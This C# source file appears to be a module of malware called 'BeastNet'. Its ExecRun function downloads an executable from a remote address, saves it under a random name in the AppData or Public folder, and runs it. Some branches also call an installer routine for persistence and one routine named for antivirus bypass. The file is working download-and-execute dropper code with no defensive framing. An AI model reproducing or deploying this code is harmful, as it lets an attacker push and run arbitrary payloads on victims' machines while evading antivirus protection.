using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace BeastNet
{
    public static class Execute
    {
        static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        static void downloadFile(string url, string filename)
        {
            try
            {
                WebClient client = new WebClient();
                client.DownloadFile(url, filename);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        public static void ExecRun(string address, int type)
        {
            string publicFile = Environment.GetEnvironmentVariable("public") + "\\" + RandomString(8) + ".exe";
            string dataFile = Environment.GetEnvironmentVariable("appdata") + "\\" + RandomString(8) + ".exe";
            switch (type)
            {
                case 1:
                    downloadFile(address, dataFile);
                    Process.Start(dataFile);
                    break;
                case 3:
                    downloadFile(address, publicFile);
                    Process.Start(publicFile);
                    break;
                case 2:
                    downloadFile(address, dataFile);
                    Installer.InstallFile(dataFile);
                    Process.Start(dataFile);
                    break;
                case 4:
                    downloadFile(address, publicFile);
                    Installer.InstallFileAVBypass(publicFile);
                    Process.Start(publicFile);
                    break;
            }
        }
    }
}
